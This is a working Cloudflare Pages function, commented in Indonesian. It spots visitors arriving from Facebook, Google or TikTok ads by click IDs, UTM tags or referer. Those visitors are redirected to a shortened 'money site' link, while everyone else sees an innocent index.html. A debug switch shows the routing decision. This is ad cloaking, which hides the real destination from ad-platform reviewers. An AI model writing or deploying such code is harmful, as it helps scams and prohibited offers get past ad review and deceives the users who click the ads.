export async function onRequest(context) {
  const { request, env } = context;
  const url = new URL(request.url);

  // ====== KONFIG ======
  const MONEY_SITE = "https://t.ly/V1kWU";
  const FALLBACK = "/index.html"; // gunakan absolute path
  // ====================

  // Ambil param & headers dulu (penting: tentukan fromAds sebelum serve asset)
  const params = url.searchParams;
  const utmSrc = (params.get("utm_source") || "").toLowerCase();
  const hasFB  = params.has("fbclid")  || utmSrc.includes("facebook") || utmSrc === "fb";
  const hasGA  = params.has("gclid")   || utmSrc.includes("google");
  const hasTT  = params.has("ttclid")  || utmSrc.includes("tiktok");

  const ref = (request.headers.get("referer") || "").toLowerCase();
  const refFB = ref.includes("facebook.com");
  const refGA = ref.includes("google.") || ref.includes("ads.google");
  const refTT = ref.includes("tiktok.com");

  const fromAds = hasFB || hasGA || hasTT || refFB || refGA || refTT;

  // Mode debug
  if ((params.get("debug") || "") === "1") {
    const info = {
      url: url.toString(),
      query: Object.fromEntries(params.entries()),
      referer: ref || "(kosong)",
      detected: { fb: hasFB||refFB, google: hasGA||refGA, tiktok: hasTT||refTT, fromAds },
      decision: fromAds ? "TO_MONEY_SITE" : "SERVE_INDEX"
    };
    return new Response(JSON.stringify(info,null,2), { headers: { "content-type":"application/json; charset=utf-8" }});
  }

  // Tentukan apakah request ini navigasi page-load (browser), bukan asset-fetch
  const accept = (request.headers.get("accept") || "").toLowerCase();
  const isNavigation = accept.includes("text/html");

  // --- PENTING: kalau ini navigasi dan dari iklan, redirect SEBELUM serve asset ---
  if (isNavigation && fromAds) {
    return Response.redirect(MONEY_SITE + (url.search || ""), 302);
  }

  // Coba serve asset statis terlebih dahulu (images/css/js/etc)
  try {
    const assetResp = await env.ASSETS.fetch(request);
    if (assetResp && assetResp.status !== 404) {
      return assetResp;
    }
  } catch (e) {
    // ignore asset error, fallback ke logic di bawah
    console.log("ASSETS.fetch error:", e);
  }

  // Jika request navigasi dan bukan dari ads => serve index.html (SPA fallback)
  if (isNavigation) {
    return env.ASSETS.fetch(new Request(new URL(FALLBACK, request.url).toString(), request));
  }

  // Kalau bukan navigasi dan asset ga ada => 404
  return new Response("Not Found", { status: 404, headers: { "content-type":"text/plain; charset=utf-8" }});
}
